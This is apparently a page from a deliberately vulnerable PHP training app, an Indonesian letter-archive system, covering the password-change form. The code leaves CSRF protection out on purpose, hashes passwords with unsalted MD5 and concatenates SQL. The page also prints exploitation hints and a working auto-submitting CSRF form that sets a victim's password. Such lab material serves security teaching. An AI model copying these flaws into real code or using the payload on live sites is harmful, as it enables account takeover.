<?php
require_once 'config.php';

if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

$message = '';
$error = '';

// VULNERABLE: CSRF - No token validation
// User can change their password by POST request without any CSRF protection
// An attacker can host a malicious page that submits a form to change the victim's password

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // EVASION SUPPORT: Accept alternate field names
    $new_password = $_POST['new_password'] ?? $_POST['password'] ?? $_POST['new_pass'] ?? $_POST['password_new'] ?? '';
    $confirm_password = $_POST['confirm_password'] ?? $_POST['password_confirm'] ?? $_POST['confirm_pass'] ?? '';
    
    // EVASION SUPPORT: Decode URL encoded values
    $new_password = urldecode($new_password);
    $confirm_password = urldecode($confirm_password);
    
    if ($new_password !== $confirm_password) {
        $error = "Kata sandi tidak cocok!";
    } elseif (strlen($new_password) < 5) {
        $error = "Kata sandi minimal 5 karakter!";
    } else {
        // Update password without any CSRF token verification
        $user_id = $_SESSION['user_id'];
        $hashed_password = md5($new_password);
        
        $query = "UPDATE users SET password='" . $hashed_password . "' WHERE id=" . $user_id;
        
        if ($mysqli->query($query)) {
            $message = "Kata sandi berhasil diubah!";
        } else {
            $error = "Kesalahan saat mengubah kata sandi: " . $mysqli->error;
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Sistem Arsip Surat - Ganti Password</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
        }
        .back-link {
            background-color: #fff;
            color: #1e3c72;
            text-decoration: none;
            margin-bottom: 20px;
            display: inline-block;
            padding: 10px 20px;
            border-radius: 6px;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(255,255,255,0.2);
        }
        .back-link:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(255,255,255,0.3);
        }
        h1 {
            color: #fff;
            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
        }
        .info-box {
            background-color: #fff;
            padding: 20px 25px;
            border-radius: 10px;
            margin-bottom: 25px;
            border-left: 5px solid #2a5298;
            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
            color: #333;
        }
        .info-box h2 {
            color: #1e3c72;
            margin-top: 0;
        }
        .info-box p {
            color: #666;
            margin-bottom: 0;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #1e3c72;
        }
        input[type="password"] {
            width: 100%;
            padding: 12px;
            box-sizing: border-box;
            background-color: #fff;
            color: #333;
            border: 2px solid #e0e0e0;
            border-radius: 6px;
            transition: all 0.3s ease;
        }
        input[type="password"]:focus {
            outline: none;
            border-color: #2a5298;
            box-shadow: 0 0 0 3px rgba(42, 82, 152, 0.1);
        }
        button {
            padding: 12px 24px;
            background: linear-gradient(135deg, #2a5298 0%, #1e3c72 100%);
            color: #fff;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
            box-shadow: 0 3px 10px rgba(42, 82, 152, 0.3);
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(42, 82, 152, 0.4);
        }
        .message {
            background-color: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 15px;
            border: 1px solid #c3e6cb;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 15px;
            border: 1px solid #f5c6cb;
        }
        .hint {
            background-color: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 6px;
            margin-top: 15px;
            font-size: 13px;
            border: 1px solid #c3e6cb;
        }
        .csrf-info {
            background-color: #fff3cd;
            color: #856404;
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.15);
        }
        .csrf-info h3 {
            color: #856404;
            margin-top: 0;
        }
        .csrf-info pre {
            background-color: #f8f9fa;
            padding: 15px;
            border-radius: 6px;
            overflow-x: auto;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="container">
        <a href="dashboard_id.php" class="back-link">← Kembali ke Dasbor</a>
        <h1>Ganti Password</h1>
        <div class="info-box">
            <h2>Ubah Password Akun</h2>
            <p>Ubah password akun Anda. Formulir ini tidak memiliki perlindungan token CSRF!</p>
        </div>
        
        <?php if ($message): ?>
            <div class="message"><?php echo htmlspecialchars($message); ?></div>
        <?php endif; ?>
        
        <?php if ($error): ?>
            <div class="error"><?php echo htmlspecialchars($error); ?></div>
        <?php endif; ?>
        
        <form method="POST">
            <div class="form-group">
                <label for="new_password">Password Baru</label>
                <input type="password" id="new_password" name="new_password" required>
            </div>
            <div class="form-group">
                <label for="confirm_password">Konfirmasi Password</label>
                <input type="password" id="confirm_password" name="confirm_password" required>
            </div>
            <button type="submit">Ubah Password</button>
        </form>
        
        <div class="hint">
            <strong>Petunjuk Eksploitasi:</strong><br>
            • Tidak ada token CSRF yang divalidasi - formulir dapat dikirim dari sumber mana pun<br>
            • Buat file HTML berbahaya yang mengirim formulir secara otomatis<br>
            • Tipu pengguna agar mengunjungi halaman berbahaya saat login
        </div>
        
        <div class="csrf-info">
            <h3>⚠️ Contoh Serangan CSRF</h3>
            <p>Penyerang dapat membuat HTML ini dan menipu Anda untuk mengunjunginya:</p>
            <pre>&lt;form action="http://localhost:8000/csrf.php" method="POST"&gt;
    &lt;input type="hidden" name="new_password" value="hacked123"&gt;
    &lt;input type="hidden" name="confirm_password" value="hacked123"&gt;
    &lt;input type="submit" value="Klik di sini"&gt;
&lt;/form&gt;
&lt;script&gt;
    document.forms[0].submit();
&lt;/script&gt;</pre>
            <p>Atau sembed iframe yang mengirim formulir secara otomatis!</p>
        </div>
    </div>
</body>
</html>
